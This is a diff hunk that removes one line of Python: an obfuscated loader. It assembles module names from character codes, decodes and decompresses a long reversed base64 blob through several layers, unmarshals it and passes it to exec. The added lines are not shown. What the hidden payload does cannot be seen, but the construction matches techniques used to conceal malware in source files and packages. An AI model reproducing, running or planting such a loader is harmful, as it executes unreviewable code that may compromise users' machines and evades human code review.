@@ -1,1 +1,927 @@
-__a=chr(109)+chr(97)+chr(114);__b=__import__(__a+'shal');__c=chr(103)+chr(122);__d=__import__(__c+'ip');__e=chr(108)+chr(122);__f=__import__(__e+'ma');__g=chr(122);__h=__import__(__g+'lib');__i=chr(98)+chr(97)+chr(115);__j=__import__(__i+'e64');__k=lambda __l:(__b.loads(__d.decompress(__f.decompress(__h.decompress(__j.b64decode(__l[::-1]))))));__m=chr(101)+chr(120);__n=__import__('builtins').__dict__[__m+'ec'];__n(__k('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